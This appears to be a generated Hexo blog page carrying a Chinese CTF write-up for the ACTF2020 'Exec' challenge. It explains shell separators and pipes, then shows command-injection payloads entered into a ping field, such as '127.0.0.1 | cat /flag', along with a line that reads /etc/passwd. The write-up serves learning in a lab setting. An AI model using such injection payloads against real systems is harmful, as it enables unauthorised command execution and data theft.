@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Exec | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="命令执行管道符“;”分号的使用方式：command1;command2 用分号隔开每条命令，并且从左到右的顺序执行命令，彼此之间相互独立，互不干涉。 “|”管道符使用上一条命令的输出，作为下一条命令的输入，在ctf中：ping 127.0.0.1 | ls (只会执行ls不会执行ping命令） 方式：command1 | command2 实例利用一个管道 1rmp -qa | grep licq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Exec">
+<meta property="og:url" content="http://example.com/2021/07/16/[ACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B]Exec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="命令执行管道符“;”分号的使用方式：command1;command2 用分号隔开每条命令，并且从左到右的顺序执行命令，彼此之间相互独立，互不干涉。 “|”管道符使用上一条命令的输出，作为下一条命令的输入，在ctf中：ping 127.0.0.1 | ls (只会执行ls不会执行ping命令） 方式：command1 | command2 实例利用一个管道 1rmp -qa | grep licq">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-07-15T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-07-15T16:29:59.909Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="命令执行">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/"></a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/http/" style="font-size: 10px;">http</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 16px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 14px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 18px;">脚本编写</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-[ACTF2020 新生赛]Exec(命令执行)" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/07/16/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/" class="article-date">
+  	<time datetime="2021-07-15T16:00:00.000Z" itemprop="datePublished">2021-07-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      Exec
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag">命令执行</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><h3 id="“-”分号的使用"><a href="#“-”分号的使用" class="headerlink" title="“;”分号的使用"></a>“;”分号的使用</h3><p>方式：command1;command2</p>
+<p>用分号隔开每条命令，并且从左到右的顺序执行命令，彼此之间相互独立，互不干涉。</p>
+<h3 id="“-”管道符使用"><a href="#“-”管道符使用" class="headerlink" title="“|”管道符使用"></a>“|”管道符使用</h3><p>上一条命令的输出，作为下一条命令的输入，在ctf中：ping 127.0.0.1 | ls (只会执行ls不会执行ping命令）</p>
+<p>方式：command1 | command2</p>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>利用一个管道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmp -qa | grep licq //将rmp -qa输出的结果通过管道输送给grep命令</span><br></pre></td></tr></table></figure>
+<p>rmp -qa是输出系统中所有安装的RPM包，grep licp是查找有licp字符的RPM包<br>grep命令是查找文件里满足条件的字符串</p>
+<p>利用多条管道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /ect/passwd | grep /bin/bash | wc -l //将第一个管道的输出（passwd的内容）通过管道输送给第二个管道，将第二管道的输出（passwd内容里有/bin/bash的所有行）通过管道输送给第三个管道，第三个管道通过wc命令统计出输入的行数，并输出</span><br></pre></td></tr></table></figure>
+<p>wc命令是统计出输入的行数</p>
+<h3 id="“-amp-”符号的用法，在ctf中：ping-127-0-0-1-amp-ls（先输出ls，再执行ping命令）"><a href="#“-amp-”符号的用法，在ctf中：ping-127-0-0-1-amp-ls（先输出ls，再执行ping命令）" class="headerlink" title="“&amp;”符号的用法，在ctf中：ping 127.0.0.1 &amp; ls（先输出ls，再执行ping命令）"></a>“&amp;”符号的用法，在ctf中：ping 127.0.0.1 &amp; ls（先输出ls，再执行ping命令）</h3><p>方式：command 1&amp;</p>
+<p>默认情况下，进程是前台进程，这样会占用shell，无法执行其它进程，所以有些没有的进程都希望可以放在后台，所以此时我们在后台的参数后面加上“&amp;”实现这个目的</p>
+<h3 id="“-amp-amp-”符号和“-”符号"><a href="#“-amp-amp-”符号和“-”符号" class="headerlink" title="“&amp;&amp;”符号和“||”符号"></a>“&amp;&amp;”符号和“||”符号</h3><p>“&amp;&amp;”和“||”符号满足短路原则。“&amp;&amp;”符号，如果左边为假，则不执行右边，反之，执行右边。而“||”符号，如果左边为真，则不执行右边，反之，执行右边</p>
+<p>“&amp;&amp;”格式：command 1 &amp;&amp; command 2<br>“||”格式：command 1 || command 2</p>
+<h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><p>判断主机存活</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 -w 1 192.168.1.1 &amp;&gt; /dev/null &amp;&amp; result=0 || result=1</span><br></pre></td></tr></table></figure>
+<p>重定向：&gt;和&gt;&gt;是输出重定向，&gt;是覆盖文件中的原有文件，文件存在，则删除文件并新建文件，并输入数据内容；&gt;&gt;是在原有文件里的内容后面添加，没有文件则创建文件，并添加内容<br>             &lt;是输入重定向<br>             &amp;&gt;是命令的标准正确输出或标准错误输出直接输出到你重定向的文件中</p>
+<h3 id="linux下的find命令"><a href="#linux下的find命令" class="headerlink" title="linux下的find命令"></a>linux下的find命令</h3><p>.表示当前用户下的目录，/表示系统的根目录</p>
+<p>find / -name filename //查找系统目录下的filename文件</p>
+<p>find命令的详细讲解：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yorkyang/p/6294894.html">https://www.cnblogs.com/yorkyang/p/6294894.html</a></p>
+<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>先构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;ls;</span><br></pre></td></tr></table></figure>
+<p>可以看到index.php文件</p>
+<p>然后构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat /index.php</span><br></pre></td></tr></table></figure>
+<p>发现一串php代码，通过审计代码发现没有任何过滤</p>
+<p>因此构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | find / -name flag</span><br></pre></td></tr></table></figure>
+
+<p>可以看到flag在/flag里</p>
+<p>所以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | cat /flag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2021/07/17/%E8%BA%AB%E4%BB%BD%E4%BF%A1%E6%81%AF%E7%88%86%E7%A0%B4/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          身份信息爆破
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/08/27/Mysql%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">Mysql的基础知识</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="ds-share share" data-thread-key="[ACTF2020 新生赛]Exec(命令执行)" data-title="Exec" data-url="http://example.com/2021/07/16/%5BACTF2020%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec(%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C)/"  data-images="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" data-content="Exec">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+      	<li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+ </div>
+ 
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2021 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/smackgg/hexo-theme-smackdown" target="_blank">Smackdown</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js"></script>
+
+
+  </div>
+</body>
+</html>
